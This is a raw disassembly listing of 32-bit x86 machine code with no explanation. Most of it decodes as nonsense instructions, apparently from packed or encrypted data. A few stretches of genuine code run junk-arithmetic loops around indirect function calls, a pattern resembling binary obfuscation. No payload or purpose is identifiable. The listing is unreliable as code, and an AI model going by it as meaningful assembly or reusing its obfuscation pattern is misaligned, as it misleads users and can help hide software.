  40aa2b:	add    eax,0xb84c8d1a
  40aa30:	add    al,0x13
  40aa32:	cld    
  40aa33:	cmp    DWORD PTR [ecx+0x68],0xc4ab7f06
  40aa3a:	(bad)  
  40aa3c:	pusha  
  40aa3d:	xor    ebx,DWORD PTR [ebx+0x1f]
  40aa40:	adc    DWORD PTR [ecx+0x18945e9e],edx
  40aa46:	out    dx,eax
  40aa47:	xor    eax,0x509b77c2
  40aa4c:	or     edi,DWORD PTR [eax-0x110ca91]
  40aa52:	in     al,0x20
  40aa54:	adc    edi,ecx
  40aa56:	push   ss
  40aa57:	rol    bh,0x21
  40aa5a:	sahf   
  40aa5b:	push   ds
  40aa5c:	loopne 0x40aa19
  40aa5e:	pop    eax
  40aa5f:	push   cs
  40aa60:	jbe    0x40aa21
  40aa62:	out    0x99,eax
  40aa64:	ror    DWORD PTR ds:0xcad2e929,1
  40aa6a:	xor    eax,0x6e21788f
  40aa6f:	out    0x58,al
  40aa71:	mov    esp,0x1581d033
  40aa76:	push   ebx
  40aa77:	inc    ebp
  40aa78:	inc    ebx
  40aa79:	add    BYTE PTR [edi+0x45],bh
  40aa7c:	inc    ebx
  40aa7d:	add    BYTE PTR [ebx],al
  40aa7f:	shr    ecx,1
  40aa81:	jno    0x40aa9d
  40aa83:	add    BYTE PTR [eax],al
  40aa85:	mov    edx,DWORD PTR [ebp-0x2c]
  40aa88:	sub    DWORD PTR ds:0x4344f3,0x7416
  40aa92:	mov    edi,DWORD PTR [ebp-0x4]
  40aa95:	mov    ebx,DWORD PTR ds:0x4345fb
  40aa9b:	sub    ebx,DWORD PTR ds:0x43460b
  40aaa1:	mov    DWORD PTR ds:0x4345fb,ebx
  40aaa7:	xor    edx,eax
  40aaa9:	xor    edi,eax
  40aaab:	or     ebx,0x1288
  40aab1:	add    edi,ecx
  40aab3:	adc    ebx,DWORD PTR ds:0x4345bb
  40aab9:	jmp    0x40aed0
  40aabe:	test   DWORD PTR [eax-0x4c324c3f],edi
  40aac4:	jne    0x40ab36
  40aac6:	xchg   ebx,eax
  40aac7:	in     eax,0x4e
  40aac9:	in     eax,dx
  40aaca:	cmp    eax,0xfc17e503
  40aacf:	(bad)  
  40aad0:	jle    0x40ab50
  40aad2:	jo     0x40ab4d
  40aad4:	jle    0x40ab54
  40aad6:	std    
  40aad7:	or     BYTE PTR [edi+0x1449e4c1],bl
  40aadd:	gs in  al,dx
  40aadf:	call   0x8b0efc40
  40aae4:	(bad)  
  40aae5:	and    eax,0xd28847b9
  40aaea:	ds call 0x7eb55d0c
  40aaf0:	cmp    eax,0x22bc0aa4
  40aaf5:	mov    al,dh
  40aaf7:	icebp  
  40aaf8:	std    
  40aaf9:	xor    al,0x2e
  40aafb:	sar    BYTE PTR [esi+0x367097],1
  40ab01:	and    edx,ebx
  40ab03:	je     0x40aa8b
  40ab05:	sbb    eax,0x4591a2e8
  40ab0a:	and    esp,DWORD PTR [eax-0x79]
  40ab0d:	jmp    0xbe51c545
  40ab12:	jns    0x40ab05
  40ab14:	stos   BYTE PTR es:[edi],al
  40ab15:	pop    es
  40ab16:	lahf   
  40ab17:	jl     0x40aab7
  40ab19:	dec    edi
  40ab1a:	popf   
  40ab1b:	lods   eax,DWORD PTR ds:[esi]
  40ab1c:	mov    bl,0x3a
  40ab1e:	in     al,0xec
  40ab20:	xor    eax,0x5848dfd8
  40ab25:	popa   
  40ab26:	or     al,0xf2
  40ab28:	sub    esp,eax
  40ab2a:	pop    edx
  40ab2b:	cmp    ebp,0xffffff9e
  40ab2e:	dec    BYTE PTR ds:0x4b8c2620
  40ab34:	and    BYTE PTR [edx-0x7e],bh
  40ab37:	sbb    BYTE PTR [edi+0x1a5c451],cl
  40ab3d:	sub    bl,BYTE PTR [edi+esi*1-0x3a]
  40ab41:	or     edx,DWORD PTR [ebx]
  40ab43:	sahf   
  40ab44:	cmp    eax,0xb92bd435
  40ab49:	clc    
  40ab4a:	and    eax,0x3b3b55ac
  40ab4f:	cdq    
  40ab50:	shr    DWORD PTR [eax],cl
  40ab52:	xor    BYTE PTR [eax+0x7a47be44],cl
  40ab58:	dec    edx
  40ab59:	pop    eax
  40ab5a:	cmc    
  40ab5b:	clc    
  40ab5c:	inc    esp
  40ab5d:	pop    ecx
  40ab5e:	dec    ecx
  40ab5f:	dec    eax
  40ab60:	xchg   esp,eax
  40ab61:	pop    esp
  40ab62:	cmp    bl,BYTE PTR [esi+edi*4-0x55d807d6]
  40ab69:	ds out 0xfe,eax
  40ab6c:	mov    ebx,0x72a3bae7
  40ab71:	out    dx,al
  40ab72:	cmp    esp,DWORD PTR [edi+esi*1]
  40ab75:	enter  0x18d0,0x2e
  40ab79:	stos   DWORD PTR es:[edi],eax
  40ab7a:	or     BYTE PTR [esi+ecx*4],dl
  40ab7d:	(bad)  
  40ab7e:	sbb    BYTE PTR [edi-0x7f],bh
  40ab81:	pusha  
  40ab82:	pmaxub mm5,QWORD PTR [eax+0x4a9deb26]
  40ab89:	cdq    
  40ab8a:	add    bl,ch
  40ab8c:	and    eax,0xe7f52837
  40ab91:	popa   
  40ab92:	add    ebx,eax
  40ab94:	fisttp WORD PTR [ebx]
  40ab96:	pop    esi
  40ab97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab98:	retf   0xb3
  40ab9b:	call   FWORD PTR [ebp-0x7d]
  40ab9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab9f:	ins    DWORD PTR es:[edi],dx
  40aba0:	or     eax,0x6e42b0b3
  40aba5:	scas   eax,DWORD PTR es:[edi]
  40aba6:	sbb    bh,cl
  40aba8:	mov    ebx,fs
  40abaa:	jns    0x40ab4f
  40abac:	std    
  40abad:	(bad)  
  40abaf:	dec    ecx
  40abb0:	add    bh,BYTE PTR gs:[ebx-0x333ee001]
  40abb7:	repz and edx,eax
  40abba:	pop    edx
  40abbb:	xor    DWORD PTR [ebx+esi*4],esp
  40abbe:	xchg   esi,eax
  40abbf:	jmp    0x392701d7
  40abc4:	imul   ebp,DWORD PTR [esi-0x22],0xffffff9c
  40abc8:	pop    edi
  40abc9:	dec    ecx
  40abca:	add    DWORD PTR [ebp+0x4555d92a],ebp
  40abd0:	daa    
  40abd1:	aaa    
  40abd2:	repnz out 0x46,al
  40abd5:	in     eax,0x69
  40abd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40abd8:	pop    es
  40abd9:	enter  0x4010,0xc0
  40abdd:	pop    edi
  40abde:	adc    eax,0xe7d0e376
  40abe3:	aaa    
  40abe4:	nop
  40abe5:	sbb    al,0x33
  40abe7:	mov    ebx,DWORD PTR [ecx]
  40abe9:	dec    ebx
  40abea:	or     esp,edi
  40abec:	inc    esp
  40abed:	data16 clc 
  40abef:	call   0x196a0c81
  40abf4:	mov    WORD PTR [esi-0xcb985c9],?
  40abfa:	xchg   esp,eax
  40abfb:	adc    ch,BYTE PTR [ebx]
  40abfd:	xchg   esi,eax
  40abfe:	pop    esp
  40abff:	mov    al,0xd6
  40ac01:	push   es
  40ac02:	mov    bh,0x24
  40ac04:	sub    DWORD PTR [edi-0x5b],ebx
  40ac07:	sti    
  40ac08:	pushf  
  40ac09:	rol    DWORD PTR [edi],0x51
  40ac0c:	nop
  40ac0d:	push   0x51
  40ac0f:	lods   eax,DWORD PTR ds:[esi]
  40ac10:	pop    esp
  40ac11:	out    0x14,eax
  40ac13:	cwde   
  40ac14:	lahf   
  40ac15:	int    0xfb
  40ac17:	inc    ecx
  40ac18:	xchg   ecx,eax
  40ac19:	inc    esp
  40ac1a:	out    0x67,eax
  40ac1c:	in     al,0x3b
  40ac1e:	add    bl,BYTE PTR [eax+0x34]
  40ac21:	icebp  
  40ac22:	sub    DWORD PTR ds:0x35a2435f,0xceef3e93
  40ac2c:	pop    ecx
  40ac2d:	dec    eax
  40ac2e:	aad    0x0
  40ac30:	xchg   esp,eax
  40ac31:	leave  
  40ac32:	and    al,al
  40ac34:	stos   DWORD PTR es:[edi],eax
  40ac35:	pop    esi
  40ac36:	(bad)  
  40ac37:	rol    BYTE PTR [eax-0x505e1461],1
  40ac3d:	xor    eax,0x5cff9941
  40ac42:	and    dh,ah
  40ac44:	jnp    0x40ac30
  40ac46:	mov    al,ds:0x76e3a031
  40ac4b:	pop    esi
  40ac4c:	add    al,0xc3
  40ac4e:	inc    esp
  40ac4f:	test   eax,0xb531b194
  40ac54:	push   eax
  40ac55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac56:	and    al,0x1a
  40ac58:	dec    edi
  40ac59:	xchg   ebx,eax
  40ac5a:	repnz mov edx,0x96c2a0dc
  40ac60:	push   0x38
  40ac62:	call   0xe1375ffb
  40ac67:	xchg   ebx,eax
  40ac68:	pop    ecx
  40ac69:	jbe    0x40ac0b
  40ac6b:	lods   eax,DWORD PTR ds:[esi]
  40ac6c:	mov    bh,0xdd
  40ac6e:	jmp    0x40ac97
  40ac70:	sbb    dl,BYTE PTR [edi+0x2a86475b]
  40ac76:	fstp   QWORD PTR [esi]
  40ac78:	add    edx,esi
  40ac7a:	inc    eax
  40ac7b:	cld    
  40ac7c:	retf   0x933e
  40ac7f:	and    eax,0xbc1cec3c
  40ac84:	inc    ecx
  40ac85:	sbb    dh,BYTE PTR [edx]
  40ac87:	fisttp DWORD PTR [edx+0x5aef5dbb]
  40ac8d:	sbb    dl,bh
  40ac8f:	jbe    0x40aca4
  40ac91:	xor    al,0x39
  40ac93:	add    eax,0x9fbd6a6d
  40ac98:	xor    eax,0x3f72e28a
  40ac9d:	les    ebp,FWORD PTR [esi+0x58d5aeb4]
  40aca3:	int3   
  40aca4:	fild   WORD PTR [esi]
  40aca6:	data16 or bh,BYTE PTR [ebp+0x7a]
  40acaa:	lods   eax,DWORD PTR ds:[esi]
  40acab:	jno    0x40ad18
  40acad:	imul   BYTE PTR [ecx-0x5d6ab13d]
  40acb3:	jno    0x40acf4
  40acb5:	test   eax,0xfd432f5b
  40acba:	push   edi
  40acbb:	add    al,0x7d
  40acbd:	pop    ecx
  40acbe:	into   
  40acbf:	inc    ebp
  40acc0:	push   eax
  40acc1:	into   
  40acc2:	pop    ebp
  40acc3:	mov    ecx,0x6cba66b9
  40acc8:	stos   BYTE PTR es:[edi],al
  40acc9:	inc    edx
  40acca:	mov    BYTE PTR [ecx-0x1e694bee],bh
  40acd0:	lods   al,BYTE PTR ds:[esi]
  40acd1:	cdq    
  40acd2:	inc    eax
  40acd3:	(bad)  
  40acd5:	mov    edx,edi
  40acd7:	(bad)  
  40acd8:	(bad)  
  40acd9:	out    dx,eax
  40acda:	cmp    BYTE PTR [ebp+0x4a28b3a5],ch
  40ace0:	daa    
  40ace1:	cmp    edi,ecx
  40ace3:	(bad)  
  40ace4:	repz xor BYTE PTR [edx+0x3d609853],0x86
  40acec:	(bad)  
  40aced:	mov    ds:0xff492c07,eax
  40acf2:	jb     0x40ace6
  40acf4:	dec    ebx
  40acf5:	or     eax,DWORD PTR [ecx+0x2d78e161]
  40acfb:	add    DWORD PTR [ecx-0x34311d36],ecx
  40ad01:	and    DWORD PTR [ebx+0x1ae003f6],ebp
  40ad07:	cli    
  40ad08:	sbb    BYTE PTR [ebp-0x40],al
  40ad0b:	repz fcomp QWORD PTR [esi+0x36]
  40ad0f:	sti    
  40ad10:	push   cs
  40ad11:	repz push ss
  40ad13:	lods   al,BYTE PTR ds:[esi]
  40ad14:	(bad)  
  40ad15:	cmp    al,0xdb
  40ad17:	mov    edx,0x36c4602e
  40ad1c:	push   esi
  40ad1d:	add    eax,0xc6401639
  40ad22:	data16 add al,ch
  40ad25:	mov    bh,0x44
  40ad27:	xchg   ebx,eax
  40ad28:	jne    0x40acda
  40ad2a:	adc    ecx,DWORD PTR [edi+0x1c]
  40ad2d:	xchg   DWORD PTR [ebp+0x4544c53d],ebx
  40ad33:	jmp    0xa64e:0xf5dfa7db
  40ad3a:	mov    al,ds:0x9d750899
  40ad3f:	or     al,0x16
  40ad41:	lods   al,BYTE PTR ds:[esi]
  40ad43:	int    0x66
  40ad45:	mov    eax,ds:0xfc4fcf7
  40ad4a:	fild   WORD PTR [edx+0x7e]
  40ad4d:	inc    eax
  40ad4e:	mov    DWORD PTR [edi],0x64ea9a9d
  40ad54:	mov    dl,BYTE PTR [edx-0x7ee59208]
  40ad5a:	and    eax,0x6a82ffa2
  40ad5f:	push   0xffffff93
  40ad61:	lahf   
  40ad62:	sub    eax,0x63d4345a
  40ad67:	ja     0x40ad09
  40ad69:	jmp    0x56ece633
  40ad6e:	fild   DWORD PTR ds:0xd04e97bf
  40ad74:	mov    al,ds:0xcb41d44d
  40ad79:	adc    DWORD PTR [ecx+ebp*1+0x5d],0xdcf92bcf
  40ad81:	and    BYTE PTR [ebp-0x2e],cl
  40ad84:	sbb    al,BYTE PTR [ebx+0x69]
  40ad87:	xchg   ebp,eax
  40ad88:	xchg   esi,eax
  40ad89:	dec    edx
  40ad8a:	jb     0x40ad19
  40ad8c:	and    eax,0xad36b730
  40ad91:	mov    edi,0x7e4157fd
  40ad96:	adc    eax,0xbd62fe45
  40ad9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad9c:	int3   
  40ad9d:	push   esi
  40ad9e:	ins    BYTE PTR es:[edi],dx
  40ad9f:	out    dx,al
  40ada0:	loopne 0x40ad8d
  40ada2:	xchg   ecx,eax
  40ada3:	popa   
  40ada4:	leave  
  40ada5:	dec    esp
  40ada6:	clc    
  40ada7:	ror    BYTE PTR [ecx-0x6f],0xd3
  40adab:	in     eax,0x93
  40adad:	das    
  40adae:	outs   dx,DWORD PTR ds:[esi]
  40adaf:	(bad)  
  40adb0:	sti    
  40adb1:	icebp  
  40adb2:	sbb    dh,al
  40adb4:	(bad)  
  40adb5:	sub    cl,dl
  40adb7:	mov    bh,0x41
  40adb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adba:	(bad)  
  40adbc:	inc    ebp
  40adbd:	leave  
  40adbe:	mov    eax,0xb0860048
  40adc3:	loope  0x40ad91
  40adc5:	or     eax,0x778bb867
  40adca:	push   ebp
  40adcb:	out    0xf3,al
  40adcd:	jmp    0x8e357b8e
  40add2:	in     al,dx
  40add3:	xchg   ebp,eax
  40add4:	ret    
  40add5:	jecxz  0x40adf7
  40add7:	and    BYTE PTR [eax-0x1e],dh
  40adda:	jns    0x40ae03
  40addc:	jp     0x40adcd
  40adde:	sbb    al,0x4d
  40ade0:	xchg   ecx,eax
  40ade1:	das    
  40ade2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ade3:	adc    edx,DWORD PTR [ecx+0x5b2d4ef3]
  40ade9:	ror    DWORD PTR [eax+ebx*2+0xcf1ce98],0x3c
  40adf1:	shl    ebx,0xa0
  40adf4:	sbb    ebx,DWORD PTR [ebx]
  40adf6:	xchg   esp,eax
  40adf7:	lods   al,BYTE PTR ds:[esi]
  40adf8:	pop    ds
  40adf9:	call   0xf1839985
  40adfe:	(bad)  
  40adff:	sub    BYTE PTR [bx+si],bh
  40ae02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae03:	mov    ebx,eax
  40ae05:	push   es
  40ae06:	and    ecx,DWORD PTR [edx+0x70ca9d28]
  40ae0c:	mov    cl,0x25
  40ae0e:	sub    al,0x2a
  40ae10:	push   cs
  40ae11:	push   ecx
  40ae12:	xor    DWORD PTR [ebx],edi
  40ae14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae15:	jno    0x40addf
  40ae17:	outs   dx,DWORD PTR ds:[esi]
  40ae18:	sahf   
  40ae19:	or     eax,0x5880614c
  40ae1e:	or     DWORD PTR [ecx+0x4371d33e],0xffffff88
  40ae25:	out    0x13,al
  40ae27:	mov    eax,0xdf79c0db
  40ae2c:	test   bh,al
  40ae2e:	push   ebp
  40ae2f:	pop    esp
  40ae30:	adc    al,0xe
  40ae32:	test   BYTE PTR [ebx],ch
  40ae34:	cs sbb ecx,ebx
  40ae37:	leave  
  40ae38:	mov    DWORD PTR [edi+0x6a4c5a51],edi
  40ae3e:	pop    esi
  40ae3f:	or     BYTE PTR [edx-0x7e],0xa3
  40ae43:	sbb    al,0x9a
  40ae45:	mov    esi,0x7963acbf
  40ae4a:	xlat   BYTE PTR ds:[ebx]
  40ae4b:	jnp    0x40ae16
  40ae4d:	mov    dl,0xe9
  40ae4f:	jecxz  0x40aecf
  40ae51:	retf   
  40ae52:	in     eax,0x5b
  40ae54:	mov    ds:0xff0a087,al
  40ae59:	fcom   QWORD PTR [ebx+0x45]
  40ae5c:	xchg   ebx,eax
  40ae5d:	test   eax,0x7193b3ca
  40ae62:	jne    0x40ae69
  40ae64:	fld    DWORD PTR [esi-0x24]
  40ae67:	gs pushf 
  40ae69:	mov    al,ds:0xaaa960da
  40ae6e:	adc    ch,cl
  40ae70:	(bad)  
  40ae71:	mov    edi,0x62f69b3a
  40ae76:	xchg   esi,eax
  40ae77:	pop    ebp
  40ae78:	mov    ?,WORD PTR [ebx-0x47]
  40ae7b:	les    ebx,FWORD PTR [ebx-0x5be219ec]
  40ae81:	cdq    
  40ae82:	dec    edi
  40ae83:	adc    DWORD PTR [ecx-0x404e741c],esp
  40ae89:	inc    ebx
  40ae8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ae8b:	fdivr  DWORD PTR [ebp-0x5b8f2675]
  40ae91:	fwait
  40ae92:	jg     0x40ae8a
  40ae94:	rcr    DWORD PTR [ebx+0x1d295b94],1
  40ae9a:	(bad)
  40ae9e:	xor    eax,0x43a424f8
  40aea3:	jmp    0x13903a35
  40aea8:	xor    eax,0xcbb0fa72
  40aead:	and    ah,BYTE PTR [esi]
  40aeaf:	xchg   DWORD PTR [eax+eiz*2-0x2f],ebp
  40aeb3:	into   
  40aeb4:	mov    edi,0x189b1196
  40aeb9:	fisubr WORD PTR [ebx]
  40aebb:	mov    esp,0xb141ede
  40aec0:	inc    edi
  40aec1:	fucomp st(1)
  40aec3:	out    dx,eax
  40aec4:	xor    edi,ecx
  40aec6:	jno    0x40aed4
  40aec8:	fild   DWORD PTR [ebx]
  40aeca:	sahf   
  40aecb:	or     edx,edx
  40aecd:	loopne 0x40af26
  40aecf:	sub    DWORD PTR [ebx],eax
  40aed1:	ror    DWORD PTR [edi],1
  40aed3:	scas   eax,DWORD PTR es:[edi]
  40aed4:	xlat   BYTE PTR ds:[ebx]
  40aed5:	xor    ebx,DWORD PTR ds:0x434553
  40aedb:	mov    edi,DWORD PTR [ebp-0x8]
  40aede:	mov    ebx,DWORD PTR [ebp-0x10]
  40aee1:	xor    DWORD PTR ds:0x434547,0x7c2a
  40aeeb:	sub    ebx,edi
  40aeed:	mov    DWORD PTR ds:0x43453f,0x592f
  40aef7:	cmp    ebx,edx
  40aef9:	mov    DWORD PTR ds:0x4345ff,0x4e0a
  40af03:	ja     0x40af21
  40af09:	mov    DWORD PTR ds:0x43458f,ebx
  40af0f:	mov    edx,DWORD PTR [ebp-0x28]
  40af12:	mov    DWORD PTR ds:0x4344ef,0x4d1d
  40af1c:	jmp    0x40bcba
  40af21:	sub    DWORD PTR ds:0x43453b,ebx
  40af27:	mov    edx,DWORD PTR [ebp-0x30]
  40af2a:	add    edi,edi
  40af2c:	mov    edi,DWORD PTR [ebp-0x4]
  40af2f:	and    DWORD PTR ds:0x434547,0x0
  40af39:	jmp    0x40af4d
  40af3e:	xor    ebx,ebx
  40af40:	or     ebx,DWORD PTR ds:0x434547
  40af46:	inc    ebx
  40af47:	mov    DWORD PTR ds:0x434547,ebx
  40af4d:	cmp    DWORD PTR ds:0x434547,0x1a
  40af54:	jae    0x40af87
  40af5a:	cmp    DWORD PTR ds:0x434547,0x22
  40af61:	jne    0x40af82
  40af67:	push   0x434577
  40af6c:	push   DWORD PTR [ebp-0x28]
  40af6f:	push   0x43458b
  40af74:	push   0x42d8
  40af79:	push   DWORD PTR [ebp-0x24]
  40af7c:	call   DWORD PTR ds:0x4130c4
  40af82:	jmp    0x40af3e
  40af87:	xor    edx,eax
  40af89:	xor    ebx,0x22d8
  40af8f:	xor    edi,eax
  40af91:	add    edi,ecx
  40af93:	and    DWORD PTR ds:0x434613,0x0
  40af9d:	mov    ebx,DWORD PTR ds:0x434613
  40afa3:	inc    ebx
  40afa4:	mov    DWORD PTR ds:0x434613,ebx
  40afaa:	cmp    DWORD PTR ds:0x434613,0x23
  40afb1:	jne    0x40afd2
  40afb7:	push   DWORD PTR [ebp-0x10]
  40afba:	push   DWORD PTR [ebp-0x18]
  40afbd:	push   0x635c
  40afc2:	push   0x3675
  40afc7:	push   0x36d2
  40afcc:	call   DWORD PTR ds:0x413290
  40afd2:	cmp    DWORD PTR ds:0x434613,0x14
  40afd9:	jb     0x40af9d
  40afdf:	add    edx,ecx
  40afe1:	imul   edx,edi
  40afe4:	mov    edi,DWORD PTR [ebp-0x8]
  40afe7:	mov    ebx,DWORD PTR [ebp-0x10]
  40afea:	jmp    0x40b401
  40afef:	aas    
  40aff0:	and    DWORD PTR [eax],0xefb16010
  40aff6:	push   ecx
  40aff7:	repnz test al,0x23
  40affa:	pusha  
  40affb:	jbe    0x40aff0
  40affd:	daa    
  40affe:	ss idiv dl
  40b001:	jle    0x40b081
  40b003:	jo     0x40b07e
  40b005:	jle    0x40b085
  40b007:	scas   al,BYTE PTR es:[edi]
  40b008:	pop    es
  40b009:	jo     0x40b059
  40b00b:	push   es
  40b00c:	pop    ebp
  40b00d:	ficomp WORD PTR [edx]
  40b00f:	sub    BYTE PTR [esi-0x28],ch
  40b012:	jmp    0xc1b4fa8e
  40b017:	push   cs
  40b018:	push   ss
  40b019:	mov    ds:0x912a2e42,eax
  40b01e:	push   ebp
  40b01f:	arpl   WORD PTR [ebx],si
  40b021:	cld    
  40b022:	sub    al,0x6b
  40b024:	or     DWORD PTR [esp+edx*4],ecx
  40b027:	cld    
  40b028:	lahf   
  40b029:	xchg   esi,eax
  40b02a:	xor    al,0x5
  40b02c:	call   0xbef42443
  40b031:	pop    ebp
  40b032:	inc    edi
  40b033:	inc    esi
  40b034:	ror    DWORD PTR [ecx+0x17],cl
  40b037:	mov    bl,0xc6
  40b039:	or     cl,BYTE PTR [esi]
  40b03b:	xchg   edx,eax
  40b03c:	pop    edx
  40b03d:	or     eax,0x8bee3e4f
  40b042:	in     al,dx
  40b043:	add    eax,0x38f6a008
  40b048:	stos   DWORD PTR es:[edi],eax
  40b049:	or     al,0x36
  40b04b:	xchg   edx,eax
  40b04c:	xor    DWORD PTR [ecx-0x214c1b89],eax
  40b052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b053:	mov    dh,0x3a
  40b055:	jmp    0x867fd93
  40b05a:	jbe    0x40b08e
  40b05c:	cdq    
  40b05d:	scas   eax,DWORD PTR es:[edi]
  40b05e:	mul    DWORD PTR [edx]
  40b060:	jge    0x40afe8
  40b062:	outs   dx,BYTE PTR ds:[esi]
  40b063:	popf   
  40b064:	mov    dl,0x18
  40b066:	stos   BYTE PTR es:[edi],al
  40b067:	sbb    DWORD PTR [eax],eax
  40b069:	sub    ebx,DWORD PTR [ecx+0x54]
  40b06c:	dec    eax
  40b06d:	popa   
  40b06e:	imul   edx,DWORD PTR [esi+0x85e7aa8],0x15385bd1
  40b078:	loopne 0x40b0ab
  40b07a:	adc    esi,DWORD PTR [ebp+0x58]
  40b07d:	mov    BYTE PTR [ecx+0x6f35d350],cl
  40b083:	(bad)  ds:0x8d54617d
  40b089:	adc    BYTE PTR ds:0x44365459,0x5b
  40b090:	outs   dx,DWORD PTR ds:[esi]
  40b091:	or     DWORD PTR [eax],0xe214dda6
  40b097:	ret    0xb863
  40b09a:	das    
  40b09b:	(bad)  
  40b09c:	test   eax,0x21d7c31b
  40b0a1:	mov    BYTE PTR [edi+0x15],0x16
  40b0a5:	leave  
  40b0a6:	adc    bl,bh
  40b0a8:	mov    edi,0x18eafec
  40b0ad:	inc    edi
  40b0ae:	ins    BYTE PTR es:[edi],dx
  40b0af:	call   0x6d24746
  40b0b4:	jns    0x40b08b
  40b0b6:	xor    ecx,ecx
  40b0b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0b9:	ficom  WORD PTR [ebx-0x433269e6]
  40b0bf:	add    eax,0xca4ec267
  40b0c4:	jbe    0x40b124
  40b0c6:	in     eax,dx
  40b0c7:	push   ebx
  40b0c8:	dec    ebp
  40b0c9:	adc    eax,0xec17ba89
  40b0ce:	pusha  
  40b0cf:	(bad)  
  40b0d0:	shr    BYTE PTR [esi-0x5e],0x74
  40b0d4:	add    BYTE PTR [eax+0x3c],dh
  40b0d7:	mov    BYTE PTR [ecx-0xc],ch
  40b0da:	or     ebx,ebp
  40b0dc:	cwde   
  40b0dd:	dec    eax
  40b0de:	push   cs
  40b0df:	scas   al,BYTE PTR es:[edi]
  40b0e0:	in     eax,0x3
  40b0e2:	je     0x40b08e
  40b0e4:	shl    DWORD PTR [edx+0x46],1
  40b0e7:	daa    
  40b0e8:	bound  ebp,QWORD PTR [esi+0x58]
  40b0eb:	test   al,0x61
  40b0ed:	pop    eax
  40b0ee:	mov    eax,0x9db4e879
  40b0f3:	and    ebp,edx
  40b0f5:	addr16 mov ah,0x79
  40b0f8:	into   
  40b0f9:	and    eax,0x6b894eb2
  40b0fe:	mov    eax,ds:0x57323ef8
  40b103:	push   0x1f6259d3
  40b108:	test   eax,0x6ca4b39e
  40b10d:	out    dx,eax
  40b10e:	jg     0x40b16c
  40b110:	jne    0x40b0e7
  40b112:	dec    esi
  40b113:	aas    
  40b114:	and    bl,BYTE PTR [edx+0x2caa7c8d]
  40b11a:	sub    BYTE PTR [ebp-0x608247e7],cl
  40b120:	mov    ecx,esi
  40b122:	sbb    esi,DWORD PTR [ebp-0x5d]
  40b125:	es adc al,0x24
  40b128:	dec    eax
  40b129:	sbb    al,BYTE PTR ds:0xc35df2b9
  40b12f:	jecxz  0x40b108
  40b131:	xchg   ecx,eax
  40b132:	add    BYTE PTR [ecx+ebx*8-0x7e],dh
  40b136:	pop    ebx
  40b137:	jge    0x40b143
  40b139:	shl    BYTE PTR [edi-0x7d],1
  40b13c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b13d:	xor    bh,BYTE PTR [esi-0x1f]
  40b140:	jecxz  0x40b15b
  40b142:	xchg   ecx,eax
  40b143:	sub    eax,0x8412f676
  40b148:	sub    DWORD PTR [ebp+0x7c6e74d6],0xffffffe9
  40b14f:	sbb    al,0x7
  40b151:	mov    DWORD PTR [eax-0x3642f360],edx
  40b157:	mov    bh,0x27
  40b159:	jns    0x40b1b9
  40b15b:	pop    edx
  40b15c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b15d:	mov    ch,0x4d
  40b15f:	cmc    
  40b160:	out    0x4a,al
  40b162:	shl    esp,cl
  40b164:	jecxz  0x40b142
  40b166:	lods   al,BYTE PTR ds:[esi]
  40b167:	cwde   
  40b168:	dec    DWORD PTR [ebx+ebp*2-0x11]
  40b16c:	ins    DWORD PTR es:[edi],dx
  40b16d:	xlat   BYTE PTR ds:[ebx]
  40b16e:	loopne 0x40b125
  40b170:	call   0xf4340043
  40b175:	out    dx,eax
  40b176:	adc    ebp,edi
  40b178:	dec    edi
  40b179:	mul    BYTE PTR [edi]
  40b17b:	mov    bh,0x18
  40b17d:	outs   dx,DWORD PTR ds:[esi]
  40b17e:	mov    eax,ds:0xdc1c46fb
  40b183:	out    dx,eax
  40b184:	stc    
  40b185:	and    eax,0xec4f0b1e
  40b18a:	xor    ch,BYTE PTR [edi+0x18]
  40b18d:	out    0x30,al
  40b18f:	xor    BYTE PTR [eax],dl
  40b191:	or     bl,BYTE PTR [esi+0x644cae9f]
  40b197:	fmul   QWORD PTR [ecx+0x6c]
  40b19a:	pop    edi
  40b19b:	and    esi,ecx
  40b19d:	(bad)  [esi]
  40b19f:	push   0xfffffff4
  40b1a1:	inc    esp
  40b1a2:	imul   edx,DWORD PTR [edx+0x2369c23e],0x9facc812
  40b1ac:	outs   dx,BYTE PTR ds:[esi]
  40b1ad:	inc    DWORD PTR [ebp+0x46]
  40b1b0:	enter  0x2b2c,0xa7
  40b1b4:	shl    BYTE PTR [eax-0x3a],cl
  40b1b7:	pop    ecx
  40b1b8:	dec    esp
  40b1b9:	or     esp,esi
  40b1bb:	mov    eax,ds:0xcd75e55c
  40b1c0:	mov    ecx,0x8f921171
  40b1c5:	(bad)  
  40b1c6:	lahf   
  40b1c7:	jle    0x40b1de
  40b1c9:	add    edx,DWORD PTR [eax-0x2f]
  40b1cc:	je     0x40b1d4
  40b1ce:	mov    ah,ch
  40b1d0:	out    0x60,al
  40b1d2:	int3   
  40b1d3:	shr    BYTE PTR [eax-0x18e26fcf],1
  40b1d9:	outs   dx,BYTE PTR ds:[esi]
  40b1da:	push   0x7b61af0
  40b1df:	push   0x97fc56c3
  40b1e4:	or     eax,DWORD PTR [ebp+0x3b]
  40b1e7:	shl    BYTE PTR [ecx-0x46c8e81e],0x8c
  40b1ee:	and    edi,ecx
  40b1f0:	sbb    eax,DWORD PTR [edi*4+0x578a787c]
  40b1f7:	outs   dx,BYTE PTR ds:[esi]
  40b1f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1f9:	dec    ebp
  40b1fa:	jle    0x40b18a
  40b1fc:	jmp    0x8c5180b8
  40b201:	sbb    DWORD PTR [eax],esp
  40b203:	ja     0x40b20d
  40b205:	shl    BYTE PTR [edx+0x36],1
  40b208:	dec    edi
  40b209:	pop    esi
  40b20a:	ja     0x40b21a
  40b20c:	add    BYTE PTR [ecx+0x68],cl
  40b20f:	xor    dl,dl
  40b211:	inc    eax
